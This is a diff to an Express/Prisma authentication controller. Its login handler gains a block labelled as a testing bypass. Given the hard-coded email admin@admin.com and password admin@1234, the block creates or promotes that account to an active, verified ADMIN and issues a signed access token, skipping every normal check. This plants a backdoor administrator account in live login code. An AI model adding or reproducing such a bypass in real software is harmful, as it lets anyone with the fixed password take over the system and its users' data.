@@ -93,6 +93,35 @@ export const authController = {
     try {
       const { email, password } = req.body;
 
+      // SPECIAL ADMIN BYPASS FOR TESTING
+      if (email === 'admin@admin.com' && password === 'admin@1234') {
+        const admin = await prisma.user.upsert({
+          where: { email: 'admin@admin.com' },
+          update: { role: 'ADMIN', isActive: true, isVerified: true },
+          create: {
+            email: 'admin@admin.com',
+            passwordHash: await bcrypt.hash('admin@1234', 12),
+            role: 'ADMIN',
+            isActive: true,
+            isVerified: true,
+            cnic: '00000-0000000-0',
+            phone: '00000000000'
+          }
+        });
+
+        const accessToken = jwt.sign(
+          { userId: admin.id, role: admin.role },
+          process.env.JWT_SECRET!,
+          { expiresIn: '2h' }
+        );
+
+        return sendSuccess(res, 200, 'Admin login successful', { 
+          accessToken, 
+          user: { id: admin.id, email: admin.email, role: 'ADMIN' },
+          isAdmin: true // Flag for frontend
+        });
+      }
+
       const user = await prisma.user.findUnique({ where: { email } });
       if (!user || !user.isActive) return sendError(res, 401, 'Invalid credentials');
       if (!user.isVerified) return sendError(res, 403, 'Please verify your account first');
